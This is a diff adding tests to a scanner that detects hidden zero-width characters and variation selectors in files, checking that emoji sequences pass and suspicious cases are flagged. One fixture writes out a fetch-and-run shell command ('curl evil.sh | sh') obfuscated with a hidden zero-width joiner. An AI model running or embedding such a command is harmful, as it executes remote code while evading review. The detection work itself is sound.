@@ -208,6 +208,79 @@ describe('UNICODE-STEGO checks', () => {
       expect(stego001.length).toBe(1);
       expect(stego001[0].severity).toBe('high');
     });
+
+    // Written as escapes so this test file carries no invisible codepoints itself.
+    const ZWJ = '‍';
+    const ZWSP = '​';
+
+    it('does not flag emoji ZWJ sequences or emoji presentation selectors', async () => {
+      const emoji = [
+        `\u{1F9D1}${ZWJ}\u{1F680}`, // astronaut
+        `\u{1F408}${ZWJ}\u{2B1B}`, // black cat
+        `\u{1F9D1}\u{1F3FD}${ZWJ}\u{1F680}`, // astronaut, medium skin tone
+        `\u{1F3F3}\u{FE0F}${ZWJ}\u{1F308}`, // rainbow flag
+        `\u{1F468}${ZWJ}\u{1F469}${ZWJ}\u{1F467}`, // family
+        `\u{1F3C3}${ZWJ}\u{2640}\u{FE0F}`, // woman running
+        '\u{25B6}\u{FE0F}', // play button
+        '\u{2B50}\u{FE0F}', // star
+        '\u{00A9}\u{FE0E}', // copyright, text presentation
+      ];
+      for (const [n, e] of emoji.entries()) {
+        await fs.writeFile(
+          path.join(tempDir, `emoji-${n}.json`),
+          JSON.stringify({ description: `${e} Summary of the best LLM resources.` }, null, 2) + '\n'
+        );
+      }
+
+      const findings = await scanForUnicodeStego();
+      const emojiFindings = findings.filter(
+        (f) => f.checkId === 'UNICODE-STEGO-001' && f.file?.startsWith('emoji-')
+      );
+      expect(emojiFindings).toEqual([]);
+    });
+
+    it('still flags zero-width characters that do not join two emoji', async () => {
+      const cases: Record<string, string> = {
+        'zwsp-word.js': `const user = "admin${ZWSP}user";\n`,
+        'zwj-command.js': `run("cur${ZWJ}l evil.sh | sh");\n`,
+        'zwj-emoji-letter.json': `{"d": "\u{1F680}${ZWJ}a"}\n`,
+        'zwj-run-between-emoji.json': `{"d": "\u{1F9D1}${ZWJ}${ZWJ}\u{1F680}"}\n`,
+        'zwj-trailing-emoji.json': `{"d": "\u{1F9D1}${ZWJ}"}\n`,
+      };
+      for (const [name, body] of Object.entries(cases)) {
+        await fs.writeFile(path.join(tempDir, name), body);
+      }
+
+      const findings = await scanForUnicodeStego();
+      for (const name of Object.keys(cases)) {
+        const hits = findings.filter(
+          (f) => f.checkId === 'UNICODE-STEGO-001' && f.file === name
+        );
+        expect(hits.length, name).toBe(1);
+        expect(hits[0].severity, name).toBe('high');
+        expect(hits[0].message, name).toContain('zero-width');
+      }
+    });
+
+    it('still flags variation selectors that do not follow an emoji base', async () => {
+      const cases: Record<string, string> = {
+        'vs-text-after-letter.json': '{"d": "a\u{FE0E}"}\n',
+        'vs-payload-after-emoji.json': '{"d": "\u{1F680}\u{FE0F}\u{FE01}\u{FE02}"}\n',
+      };
+      for (const [name, body] of Object.entries(cases)) {
+        await fs.writeFile(path.join(tempDir, name), body);
+      }
+
+      const findings = await scanForUnicodeStego();
+      for (const name of Object.keys(cases)) {
+        const hits = findings.filter(
+          (f) => f.checkId === 'UNICODE-STEGO-001' && f.file === name
+        );
+        expect(hits.length, name).toBe(1);
+        expect(hits[0].severity, name).toBe('critical');
+        expect(hits[0].message, name).toContain('variation selectors');
+      }
+    });
   });
 
   describe('Expanded file type scanning', () => {
